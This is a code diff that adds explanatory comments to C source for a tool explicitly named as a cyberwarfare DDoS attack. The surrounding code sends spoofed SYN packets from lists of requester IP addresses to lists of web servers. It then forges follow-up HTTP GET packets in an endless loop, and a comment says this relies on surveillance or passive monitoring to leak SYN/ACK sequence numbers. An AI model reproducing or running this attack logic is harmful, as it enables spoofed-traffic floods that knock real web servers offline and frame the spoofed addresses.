@@ -414,7 +414,7 @@ int Cyberwarefare_DDoS_Init(AS_context *ctx) {
     return ret;
 }
 
-
+// send initially attack packet to web server attempting to open  a connection
 int Cyberwarfare_SendAttack1(AS_context *ctx, uint32_t src, uint32_t dst, int ts, OutgoingPacketQueue **optr) {
     uint32_t magic_seq = 0;
     PacketBuildInstructions *bptr = NULL;
@@ -444,6 +444,7 @@ int Cyberwarfare_SendAttack1(AS_context *ctx, uint32_t src, uint32_t dst, int ts
 }
 
 // this sends the request to the http server from the ip adddress.. all information required is already in the packet itself.. no need to keep track of anything.
+// it requires survevillance platforms, or other passive monitoring to leak the SEQ of the SYN/ACK
 int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
     PacketBuildInstructions *bptr = NULL;
     uint32_t header = rand()%0xffffffff;
@@ -472,8 +473,10 @@ int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
     PacketBuildInstructionsFree(bptr);
 #endif
     // now build packet for http request (GET .....)
+    // Build a general attack packet
     bptr = CW_BasePacket(iptr->destination_ip, iptr->destination_port, iptr->source_ip, iptr->source_port, TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW);
-    if (!bptr) return 0;    
+    if (!bptr) return 0;
+    // Change, or ensure some off the packet parameters
     bptr->seq = iptr->ack;
     bptr->ack = iptr->seq;
     bptr->header_identifier = header++;
@@ -531,15 +534,23 @@ void start_attack(AS_context *ctx) {
     int skip = 0;
     int out_count = 0;
 
+    // get pointers to the IP address structures that were loaded when the application initially started
     webservers = IPAddressesPtr(ctx, tags[0]);
     requesters = IPAddressesPtr(ctx, tags[1]);
 
+    // forever loop
     while (1) {
+        // get timestamp to check if there are so many IPs that it takes more than a second to process them all.. it will send each to network device
+        // if so
         ts = time(0);
         if (!skip) {
+            // loop for each webserver we are creating connections for
             for (web_i = 0; web_i < webservers->v4_count; web_i++) {
+                // loop for each IP address we are presenting the HTTP requests for
                 for (req_i = 0; req_i < requesters->v4_count; req_i++) {
+                    // send a SYN packet to the web server from the IP address
                     out_count += Cyberwarfare_SendAttack1(ctx, requesters->v4_addresses[req_i], webservers->v4_addresses[web_i], ts, &optr);
+                    // if fast mode (so many IPs it takes more than 1 second to generate) then we send after each
                     if (fast) {//} && out_count++ > 100) {
                         OutgoingQueueLink(ctx, optr);
                         AS_perform(ctx);
@@ -599,7 +610,7 @@ int main(int argc, char *argv[]) {
         exit(-1);
     }
 
-    // open and turn both files into IPaddress lists
+    // load ip addresses from a webserver into an IP address list
     i = 0;
     while (files[i] != NULL) {
         r = file_to_iplist(ctx, files[i], tag[i]);
@@ -622,7 +633,7 @@ int main(int argc, char *argv[]) {
     ctx->queue_buffer_size = 1024*1024;
     ctx->queue_max_packets = 100;
 
-
+    // initializes the functions above for incomming traffic to get processed for SYN/ACK packets
     Module_Add(ctx, &Cyberwarefare_DDoS_Init, NULL);
 
 
